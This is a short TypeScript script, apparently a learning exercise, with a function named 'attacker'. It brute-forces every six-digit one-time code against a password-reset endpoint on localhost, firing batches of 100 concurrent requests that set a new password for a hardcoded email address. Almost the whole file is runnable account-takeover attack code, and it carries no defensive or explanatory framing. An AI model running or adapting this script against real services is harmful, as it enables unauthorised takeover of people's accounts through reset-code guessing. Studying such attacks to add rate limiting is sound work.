import axios from 'axios'

async function sendRequest(otp: string, newPassword: string){
    let data = JSON.stringify({
        "email": "tanmaybansal.20@gmail.com",
        "otp": otp,
        "newPassword": newPassword
    });
    
    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-password',
        headers: { 
            'Content-Type': 'application/json'
        },
        data : data
    };
    
    try{

        await axios.request(config)
    }catch(e){

    }
    
}


async function attacker(){

    for(let i = 100000; i<1000000; i+=100){

        //batching
        let p = [];
        for(let j = 0; j<100; j++){
            p.push(sendRequest((i+j).toString(), "lulululululu"));
        }
        console.log(`Batch ${i} sent`);
        await Promise.all(p);
    }

    
}

attacker();